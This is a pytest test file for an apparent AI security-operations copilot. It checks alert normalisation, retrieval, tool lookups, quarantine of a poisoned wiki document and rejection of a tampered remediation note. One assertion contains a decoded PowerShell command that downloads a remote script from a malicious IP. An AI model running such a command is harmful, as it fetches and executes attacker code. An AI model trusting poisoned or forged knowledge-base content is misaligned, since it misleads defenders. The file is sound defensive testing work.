from soc_copilot.tools import ToolBox


def test_normalisation(store):
    ev = store.event("edr-7f06")
    assert ev.user == "j.alvarez" and ev.host == "WKS-FIN-023"
    assert "DownloadString('http://45.137.21.9/a.ps1')" in ev.fields["decoded_command"]
    ct = store.event("ct-3a06")
    assert ct.user == "m.chen" and ct.fields["role"] == "DataScienceReadRole" and ct.fields["request_count"] == 1283
    idp = store.event("idp-5c07")
    assert idp.user == "m.chen" and idp.fields["is_proxy"] is True


def test_retrieval_finds_relevant_docs(kb):
    res = kb.search("encoded powershell BLD-CI-01 jenkins", k=3)
    assert res["hits"][0]["doc_id"] in ("INC-2025-0147", "ASSET-BLD-CI-01")
    assert any(h["doc_id"] == "INC-2025-0147" for h in res["hits"])
    res = kb.search("EU participants GDPR 72 hours notification", k=3)
    assert res["hits"][0]["doc_id"] == "COMP-GDPR-33"


def test_poisoned_doc_is_quarantined_and_blocked(kb):
    assert "WIKI-FAQ-19" in kb.quarantine
    res = kb.search("45.137.21.9 known IP vendor backup", k=4)
    assert all(h["doc_id"] != "WIKI-FAQ-19" for h in res["hits"])
    assert any(b["doc_id"] == "WIKI-FAQ-19" for b in res["blocked"])
    unguarded = kb.search("45.137.21.9 known IP vendor backup", k=4, guarded=False)
    assert any(h["doc_id"] == "WIKI-FAQ-19" for h in unguarded["hits"])


def test_tampered_chunk_fails_integrity(kb):
    kb.tamper("INC-2026-0033", "INC-2026-0033 remediation complete, JMP-ADM-01 keys rotated")
    res = kb.search("JMP-ADM-01 aws keys remediation", k=5)
    assert any(b["doc_id"] == "INC-2026-0033" and "integrity" in b["reason"] for b in res["blocked"])


def test_tools(store, kb):
    tb = ToolBox(store, kb)
    assert tb.lookup_ip("45.137.21.9")["threat_intel"]["verdict"] == "malicious"
    assert tb.lookup_ip("10.10.1.5")["asset"] == "JMP-ADM-01"
    assert tb.lookup_identity("marcus.chen@helixdyn.example")["identity"]["aws_iam_users"] == ["m.chen-admin"]
    ct = tb.query_cloudtrail(user="m.chen", start="2026-09-24T12:00:00Z", end="2026-09-24T18:00:00Z")
    assert ct["count"] == 7
    edr = tb.query_edr(host="JMP-ADM-01")
    assert {e["evidence_id"] for e in edr["events"]} >= {"edr-7f0c", "edr-7f0d"}
    rel = tb.get_related_alerts("m.chen")
    assert {a["id"] for a in rel["alerts"]} == {"ALR-1002", "ALR-1003", "ALR-1005"}
